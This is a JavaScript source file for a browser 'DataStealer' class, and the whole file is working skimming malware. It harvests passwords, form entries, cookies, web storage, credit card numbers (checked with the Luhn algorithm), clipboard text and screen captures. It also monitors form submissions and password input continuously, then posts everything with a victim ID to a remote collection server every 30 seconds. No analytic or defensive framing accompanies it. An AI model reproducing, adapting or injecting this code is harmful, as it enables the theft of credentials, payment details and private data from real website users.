class DataStealer {
    constructor(victimId, serverUrl) {
        this.victimId = victimId;
        this.serverUrl = serverUrl;
        this.stolenData = {};
        this.isActive = false;
    }

    async startDataCollection() {
        if (this.isActive) return;
        
        this.isActive = true;
        console.log('Starting comprehensive data collection...');

        try {
            // Collect all types of data
            await this.collectCredentials();
            await this.collectCookies();
            await this.collectLocalStorage();
            await this.collectSessionStorage();
            await this.collectBrowserData();
            await this.collectFormData();
            await this.collectCreditCards();
            await this.collectSocialMedia();
            await this.collectClipboardData();
            await this.collectScreenshots();
            
            // Send collected data
            await this.sendCollectedData();
            
            // Start continuous monitoring
            this.startContinuousMonitoring();
            
        } catch (error) {
            console.error('Data collection error:', error);
            await this.sendError('stealer_error', error);
        }
    }

    async collectCredentials() {
        try {
            const credentials = {
                savedPasswords: this.extractSavedPasswords(),
                formCredentials: this.extractFormCredentials(),
                httpAuth: this.extractHTTPAuth()
            };

            this.stolenData.credentials = credentials;
        } catch (error) {
            this.stolenData.credentials = { error: error.message };
        }
    }

    extractSavedPasswords() {
        const passwords = [];
        const passwordFields = document.querySelectorAll('input[type="password"]');
        
        passwordFields.forEach(field => {
            if (field.value) {
                passwords.push({
                    field: field.name || field.id,
                    value: field.value,
                    form: field.form ? field.form.action : 'unknown',
                    timestamp: Date.now()
                });
            }
        });
        
        return passwords;
    }

    extractFormCredentials() {
        const forms = document.querySelectorAll('form');
        const credentials = [];
        
        forms.forEach(form => {
            const inputs = form.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
            const formData = {
                action: form.action,
                method: form.method,
                inputs: []
            };
            
            inputs.forEach(input => {
                if (input.value) {
                    formData.inputs.push({
                        name: input.name,
                        type: input.type,
                        value: input.value
                    });
                }
            });
            
            if (formData.inputs.length > 0) {
                credentials.push(formData);
            }
        });
        
        return credentials;
    }

    extractHTTPAuth() {
        // Attempt to extract HTTP authentication credentials
        return {
            hasAuth: document.querySelector('[autocomplete="username"]') !== null,
            authFields: Array.from(document.querySelectorAll('[autocomplete*="user"], [autocomplete*="pass"]'))
                .map(field => ({
                    type: field.type,
                    name: field.name,
                    autocomplete: field.autocomplete
                }))
        };
    }

    async collectCookies() {
        try {
            this.stolenData.cookies = {
                documentCookies: document.cookie,
                allCookies: this.getAllCookies()
            };
        } catch (error) {
            this.stolenData.cookies = { error: error.message };
        }
    }

    getAllCookies() {
        const cookies = document.cookie.split(';');
        return cookies.map(cookie => {
            const [name, value] = cookie.split('=').map(part => part.trim());
            return { name, value };
        });
    }

    async collectLocalStorage() {
        try {
            const localStorageData = {};
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                localStorageData[key] = localStorage.getItem(key);
            }
            this.stolenData.localStorage = localStorageData;
        } catch (error) {
            this.stolenData.localStorage = { error: error.message };
        }
    }

    async collectSessionStorage() {
        try {
            const sessionStorageData = {};
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                sessionStorageData[key] = sessionStorage.getItem(key);
            }
            this.stolenData.sessionStorage = sessionStorageData;
        } catch (error) {
            this.stolenData.sessionStorage = { error: error.message };
        }
    }

    async collectBrowserData() {
        this.stolenData.browser = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            languages: navigator.languages,
            cookiesEnabled: navigator.cookieEnabled,
            javaEnabled: navigator.javaEnabled(),
            pdfViewerEnabled: navigator.pdfViewerEnabled,
            doNotTrack: navigator.doNotTrack,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            vendor: navigator.vendor,
            product: navigator.product,
            productSub: navigator.productSub,
            webdriver: navigator.webdriver
        };
    }

    async collectFormData() {
        const forms = document.querySelectorAll('form');
        const formData = [];
        
        forms.forEach((form, index) => {
            const inputs = Array.from(form.elements).map(element => ({
                tagName: element.tagName,
                type: element.type,
                name: element.name,
                id: element.id,
                value: element.value,
                placeholder: element.placeholder,
                required: element.required
            }));
            
            formData.push({
                index: index,
                action: form.action,
                method: form.method,
                inputs: inputs
            });
        });
        
        this.stolenData.forms = formData;
    }

    async collectCreditCards() {
        const creditCardFields = document.querySelectorAll('input[autocomplete*="cc"], input[name*="card"], input[type="tel"]');
        const cardData = [];
        
        creditCardFields.forEach(field => {
            if (field.value && this.looksLikeCreditCard(field.value)) {
                cardData.push({
                    field: field.name || field.id,
                    value: field.value,
                    form: field.form ? field.form.action : 'unknown'
                });
            }
        });
        
        this.stolenData.creditCards = cardData;
    }

    looksLikeCreditCard(value) {
        const cleanValue = value.replace(/\s+/g, '');
        return /^\d{13,19}$/.test(cleanValue) && this.luhnCheck(cleanValue);
    }

    luhnCheck(value) {
        let sum = 0;
        let shouldDouble = false;
        
        for (let i = value.length - 1; i >= 0; i--) {
            let digit = parseInt(value.charAt(i));
            
            if (shouldDouble) {
                if ((digit *= 2) > 9) digit -= 9;
            }
            
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        
        return (sum % 10) === 0;
    }

    async collectSocialMedia() {
        const socialData = {
            loggedIn: this.checkSocialMediaLogin(),
            buttons: this.extractSocialButtons(),
            trackers: this.detectSocialTrackers()
        };
        
        this.stolenData.socialMedia = socialData;
    }

    checkSocialMediaLogin() {
        const indicators = [
            document.querySelector('[data-testid*="profile"]'),
            document.querySelector('[aria-label*="profile"]'),
            document.querySelector('[href*="logout"]'),
            document.querySelector('[href*="account"]')
        ];
        
        return indicators.some(indicator => indicator !== null);
    }

    extractSocialButtons() {
        const socialButtons = [];
        const buttons = document.querySelectorAll('button, a, div');
        
        buttons.forEach(button => {
            const text = button.textContent.toLowerCase();
            const href = button.href;
            const socialNetworks = ['facebook', 'twitter', 'instagram', 'linkedin', 'youtube', 'whatsapp', 'telegram'];
            
            socialNetworks.forEach(network => {
                if (text.includes(network) || (href && href.includes(network))) {
                    socialButtons.push({
                        network: network,
                        text: button.textContent,
                        href: href
                    });
                }
            });
        });
        
        return socialButtons;
    }

    detectSocialTrackers() {
        const scripts = Array.from(document.scripts);
        const socialTrackers = [];
        
        const trackerPatterns = [
            'facebook.com/tr',
            'connect.facebook.net',
            'twitter.com/widgets',
            'platform.twitter.com',
            'apis.google.com',
            'connect.linkedin.com'
        ];
        
        scripts.forEach(script => {
            trackerPatterns.forEach(pattern => {
                if (script.src.includes(pattern)) {
                    socialTrackers.push({
                        pattern: pattern,
                        src: script.src
                    });
                }
            });
        });
        
        return socialTrackers;
    }

    async collectClipboardData() {
        try {
            const clipboardText = await navigator.clipboard.readText();
            this.stolenData.clipboard = {
                content: clipboardText,
                length: clipboardText.length,
                timestamp: Date.now()
            };
        } catch (error) {
            this.stolenData.clipboard = {
                error: error.message,
                accessible: false
            };
        }
    }

    async collectScreenshots() {
        try {
            if (typeof HTMLCanvasElement !== 'undefined') {
                const canvas = document.createElement('canvas');
                const context = canvas.getContext('2d');
                const video = document.createElement('video');
                
                // Try to capture screen
                const stream = await navigator.mediaDevices.getDisplayMedia({
                    video: { mediaSource: "screen" }
                });
                
                video.srcObject = stream;
                
                return new Promise((resolve) => {
                    video.onloadedmetadata = () => {
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        context.drawImage(video, 0, 0);
                        const screenshot = canvas.toDataURL('image/jpeg', 0.7);
                        
                        this.stolenData.screenshots = {
                            data: screenshot.substring(0, 1000) + '...', // First 1000 chars
                            fullSize: screenshot.length,
                            timestamp: Date.now()
                        };
                        
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                    };
                });
            }
        } catch (error) {
            this.stolenData.screenshots = { error: error.message };
        }
    }

    startContinuousMonitoring() {
        // Monitor form submissions
        document.addEventListener('submit', (event) => {
            this.captureFormSubmission(event);
        });

        // Monitor input changes
        document.addEventListener('input', (event) => {
            if (event.target.type === 'password') {
                this.capturePasswordInput(event);
            }
        });

        // Monitor clipboard changes
        document.addEventListener('copy', (event) => {
            this.captureClipboardCopy(event);
        });

        // Periodic data collection
        setInterval(() => {
            this.collectCredentials();
            this.sendCollectedData();
        }, 30000); // Every 30 seconds
    }

    captureFormSubmission(event) {
        const formData = new FormData(event.target);
        const formObject = {};
        
        for (let [key, value] of formData.entries()) {
            formObject[key] = value;
        }
        
        this.stolenData.recentSubmissions = this.stolenData.recentSubmissions || [];
        this.stolenData.recentSubmissions.push({
            form: event.target.action,
            data: formObject,
            timestamp: Date.now()
        });
    }

    capturePasswordInput(event) {
        this.stolenData.passwordChanges = this.stolenData.passwordChanges || [];
        this.stolenData.passwordChanges.push({
            field: event.target.name,
            valueLength: event.target.value.length,
            timestamp: Date.now()
        });
    }

    captureClipboardCopy(event) {
        const selectedText = window.getSelection().toString();
        if (selectedText) {
            this.stolenData.clipboardCopies = this.stolenData.clipboardCopies || [];
            this.stolenData.clipboardCopies.push({
                text: selectedText.substring(0, 200), // First 200 chars
                fullLength: selectedText.length,
                timestamp: Date.now()
            });
        }
    }

    async sendCollectedData() {
        if (Object.keys(this.stolenData).length === 0) return;

        try {
            const response = await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: 'stolen_data',
                    payload: this.stolenData,
                    timestamp: Date.now()
                })
            });

            if (response.ok) {
                console.log('Data sent successfully');
                // Clear sent data but keep monitoring
                this.stolenData = {};
            }
        } catch (error) {
            console.warn('Failed to send data:', error);
            this.storeLocally();
        }
    }

    storeLocally() {
        try {
            const key = `stolen_data_${Date.now()}`;
            localStorage.setItem(key, JSON.stringify({
                victimId: this.victimId,
                data: this.stolenData,
                timestamp: Date.now()
            }));
        } catch (error) {
            console.warn('Local storage failed:', error);
        }
    }

    async sendError(type, error) {
        try {
            await fetch(`${this.serverUrl}/api/collect`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-Victim-ID': this.victimId
                },
                body: JSON.stringify({
                    victimId: this.victimId,
                    dataType: 'error',
                    payload: {
                        type: type,
                        message: error.message,
                        stack: error.stack
                    },
                    timestamp: Date.now()
                })
            });
        } catch (sendError) {
            console.warn('Failed to send error:', sendError);
        }
    }
}

// Export for use in other modules
window.DataStealer = DataStealer;
